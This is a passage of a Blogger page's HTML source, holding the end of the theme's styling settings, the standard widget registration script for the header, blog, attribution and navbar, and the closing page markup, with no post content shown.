'tabs_selected_text_color': '#000000', 'main_border_width': '0', 'content_background_color_selector': '.content-inner', 'link_color': '#2288bb', 'post_footer_border_color': '#eeeeee', 'date_header_font': 'normal bold 11px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'tabs_background_gradient': 'none', 'content_padding_horizontal': '40px', 'header_font': 'normal normal 40px \47Trebuchet MS\47,Trebuchet,Verdana,sans-serif', 'startSide': 'left', 'tabs_font': 'normal normal 12px \47Trebuchet MS\47, Trebuchet, Verdana, sans-serif', 'widget_title_text_color': '#000000', 'header_border_size': '1px', 'tabs_selected_background_color': '#eeeeee', 'date_header_margin': 'inherit', 'footer_bevel': '1px', 'image_border_small_size': '2px', 'content_shadow_spread_ie': '0', 'mobile_background_overlay': 'transparent none repeat scroll top left', 'endSide': 'right', 'date_header_padding': '0.4em', 'image_background_color': '#ffffff', 'body_rule_color': '#dddddd', 'header_bottom_border_size': '0', 'page_width_selector': '.region-inner', 'body_background_color': '#ffffff', 'header_text_color': '#000000', 'main_padding': '0', 'date_header_background_color': '#bbbbbb', 'tabs_border_width': '1px', 'body_font': 'normal normal 12px \47Trebuchet MS\47, Trebuchet, Verdana, sans-serif', 'link_hover_color': '#33aaff', 'header_background_color': 'transparent', 'keycolor': '#ffffff', 'main_padding_bottom': '65px', 'post_footer_text_color': '#666666', 'tabs_margin_top': '0', 'header_padding': '0'}, 'override': ''}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\75classic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\75flipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\75magazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\75mosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\75sidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\75snapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\75timeslide'}}}]);
_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', null, document.getElementById('Header1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', null, document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'mobile': true}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', null, document.getElementById('Attribution1'), {'attribution': 'Powered by \74a href\75\47https://www.blogger.com\47 target\75\47_blank\47\76Blogger\74/a\76.'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', null, document.getElementById('Navbar1'), {}, 'displayModeFull'));
</script><div id="arrow-container" class=""><div id="arrow-slider"><div id="left-arrow"></div></div></div>

</body></html>